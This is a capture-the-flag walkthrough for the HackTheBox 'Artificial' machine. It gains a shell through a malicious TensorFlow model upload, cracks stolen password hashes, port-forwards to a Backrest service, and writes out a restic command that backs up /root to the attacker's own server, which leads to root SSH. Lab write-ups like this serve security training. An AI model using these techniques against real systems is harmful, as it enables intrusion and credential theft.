<img width="1273" height="138" alt="Pasted image 20250811180511" src="https://github.com/user-attachments/assets/9391c1e7-b110-4f5a-9a29-308c44acf676" />


### Stuff to learn in this box 
	1. Deep Enumeration
	2. Port Forwarding
	3. Understanding New Services and How To Abuse it 

Do an `nmap` scan `nmap -A 10.10.11.74`  
<img width="1083" height="461" alt="Pasted image 20250731142038" src="https://github.com/user-attachments/assets/5042e7e7-8777-4bed-8000-c1ef52c23630" />


Put this domain "**artificial.htb**" into the `/etc/hosts` file  
<img width="809" height="82" alt="Pasted image 20250731142218" src="https://github.com/user-attachments/assets/7fc3f47f-4804-4b69-bc75-414db8dc6cbd" />


Browse to the web server, found this home page  
<img width="1260" height="723" alt="Pasted image 20250731142239" src="https://github.com/user-attachments/assets/77acb7a6-554b-48d4-8d7f-46827e359130" />


Register an account, then log in  
<img width="626" height="681" alt="Pasted image 20250731142524" src="https://github.com/user-attachments/assets/e43be05b-f9f8-488e-a8f3-03868ffff75d" />


Found this dashboard page, it's an upload functionality for AI models  
<img width="1016" height="790" alt="Pasted image 20250731142606" src="https://github.com/user-attachments/assets/6f582708-21bf-4e85-8589-b297b2f38403" />


There are some requirements, let's download it and check it out  
<img width="552" height="53" alt="Pasted image 20250731145213" src="https://github.com/user-attachments/assets/261f92ed-595a-419c-a03b-ead9864f3005" />  
tensorflow is required, search about any related exploits, found this one **[tensorflow-rce](https://mastersplinter.work/research/tensorflow-rce/)**

Modify the IP and port in the `exploit.py` file  
<img width="1121" height="325" alt="Pasted image 20250731150213" src="https://github.com/user-attachments/assets/9301d9f0-9c42-4ec5-b33d-1060c1a7e280" />


Establish a python environment then install tensorflow `pip3 install tensorflow`

Then run `exploit.py` => `exploit.h5` file created

Set a `netcat` listener on port 1337

Then upload the `exploit.h5` file, and click on "View Predictions"  
<img width="869" height="131" alt="Pasted image 20250731153939" src="https://github.com/user-attachments/assets/b62c96c4-51dc-4928-9267-d082a0e917b3" />


We've got a shell with app user 
<img width="1679" height="599" alt="Pasted image 20250805025714" src="https://github.com/user-attachments/assets/aa326fe6-fdcf-4be5-8a33-f51d82e8350f" />


List users in the `/home` directory, found the gael user  
<img width="308" height="101" alt="Pasted image 20250805030721" src="https://github.com/user-attachments/assets/f5b0a532-a9f5-4307-91da-e14cbfc7f79e" />


Doing a deep files enumeration, we found this `users.db` file 
<img width="563" height="671" alt="Pasted image 20250805030327" src="https://github.com/user-attachments/assets/6c75448c-517d-4c7a-b351-90d1e055be50" />


Cat it out, we've got the hash for **gael**  
<img width="1680" height="536" alt="Pasted image 20250805030458" src="https://github.com/user-attachments/assets/142cfd87-d22c-4c89-a8d3-fdda77642572" />


Seems an MD hash, no harm if we make sure  
<img width="858" height="463" alt="Pasted image 20250805030739" src="https://github.com/user-attachments/assets/3462aec2-27de-47d6-b8ba-d4e1ed1cb146" />


Use `hashcat` to crack the hash  
<img width="1208" height="347" alt="Pasted image 20250805030826" src="https://github.com/user-attachments/assets/635435d6-ff21-4ec1-9e9c-37e483dee881" />
We've got this password for **gael : mattp005numbertwo**  

Get a shell for gael with `ssh`  
<img width="779" height="810" alt="Pasted image 20250805030845" src="https://github.com/user-attachments/assets/393df8ba-4f0b-4c11-980c-1fa3f61b7e05" />


Cat out the user flag  
<img width="445" height="76" alt="Pasted image 20250805030857" src="https://github.com/user-attachments/assets/e60feebc-041c-413d-9733-02cdf56c5690" />


List the listening ports internally, Found 9898 port open and listening by trying each port  
<img width="1086" height="286" alt="Pasted image 20250805031828" src="https://github.com/user-attachments/assets/1fb7fb3b-8dac-4a2f-b796-4bb5f60008bf" />


Forward the connection to the same port on our localhost  
<img width="814" height="75" alt="Pasted image 20250805031841" src="https://github.com/user-attachments/assets/76bb1be3-e23e-4e5d-87cd-13cb9fb867e8" />


Browse the localhost on that port, found this **Backrest 1.7.2** service, also we need to get credentials to get in  
<img width="1479" height="324" alt="Pasted image 20250805034515" src="https://github.com/user-attachments/assets/3c3047b1-8207-4e7b-8fb1-ba13d58a331f" />
Tried to searching about an online exploit for this version but didn't found any

Let's use `find` to look for any backups files and directories  
<img width="1123" height="277" alt="Pasted image 20250805034501" src="https://github.com/user-attachments/assets/dad40f4f-dead-4e09-9f1e-dcc11d4922b3" />
Found this `backrest_backup.tar.gz` file, let's move it into our mahcine

Identify the file type with `file` command, found out it's a **tar** file, so let's change its name to remove the **.gz**, then extract it with `tar`
<img width="747" height="583" alt="Pasted image 20250805034545" src="https://github.com/user-attachments/assets/0d0e1ed1-9bf0-42ee-8db7-6ffb16a421f7" />


After digging deep in the extracted files, fond this credentials for the backrest service  
<img width="1495" height="527" alt="Pasted image 20250805034747" src="https://github.com/user-attachments/assets/68a42321-e0e3-4b4a-a1bf-c1281173a1c9" />


Use `hashcat` to crack this hash  
<img width="1292" height="127" alt="Pasted image 20250805040358" src="https://github.com/user-attachments/assets/472c349a-1827-4306-bc42-fb67fdbb70db" />
Credentials **backrest_root : !@#$%^**  

Log into backrest service using the credentials, Found this page   
<img width="1675" height="527" alt="Pasted image 20250805040613" src="https://github.com/user-attachments/assets/92ec0d48-02a8-4c46-9936-2f8303f98053" />


Download the **rest-server** release for Linux  

Set a rest listener on port 1337 with no auth `./rest-server --listen :1337 --no-auth`  
<img width="1103" height="221" alt="Pasted image 20250805070207" src="https://github.com/user-attachments/assets/18050b00-223b-4da2-8674-e876787c7216" />


Then add a repository with any name in the backrest service, and specify our machine IP and the port we sat with the rest server    
<img width="1004" height="900" alt="Pasted image 20250805070519" src="https://github.com/user-attachments/assets/8be78d22-e129-4a04-8ae4-e2fde00172ea" />


Got a connection contains the repository path `/tmp/restic`  
<img width="1083" height="218" alt="Pasted image 20250805070558" src="https://github.com/user-attachments/assets/239e8eca-a3e2-49cb-abb2-8d0362725a11" />


Click on "Run Command" tab  
<img width="887" height="327" alt="Pasted image 20250805064823" src="https://github.com/user-attachments/assets/6830b344-6461-4ddf-a0a0-9e915f71199b" />


Then paste this command to backup the `/root` directory into the backrest service `-r rest:http://10.10.16.25:1337 backup /root`
<img width="1335" height="293" alt="Pasted image 20250805070757" src="https://github.com/user-attachments/assets/473e7013-429c-43d3-9eb8-b541e88ad340" />


Then restore the backup we made for `/root` directory using `restic` binary specifying the repository path `./restic restore -r "/tmp/restic" latest --target .`
<img width="1315" height="264" alt="Pasted image 20250805071205" src="https://github.com/user-attachments/assets/a16e270e-15b5-4b88-a042-1db7f7d955bf" />

We've got a the root directory, let's go there and get the root flag

We've got the root flag  
<img width="537" height="152" alt="Pasted image 20250805071345" src="https://github.com/user-attachments/assets/6afb9963-2d96-46c1-a915-2a2062a11058" />


But with that only we didn't actually escalate our privileges to root yet 

Since we've go all files within the root directory, we can use the `id_rsa` for root to get a shell with `ssh` 
<img width="1338" height="884" alt="Pasted image 20250805062607" src="https://github.com/user-attachments/assets/16109eb3-41a4-4a3f-be23-d08ea094f2b8" />

Cool! now we got a root shell and can access the root flag that way!

**Congrats! You pawned the machine successfully!**
<img width="691" height="633" alt="Pasted image 20250805061738" src="https://github.com/user-attachments/assets/40e0d0ae-0ab5-41d8-8ac6-2e2ec2602e31" />
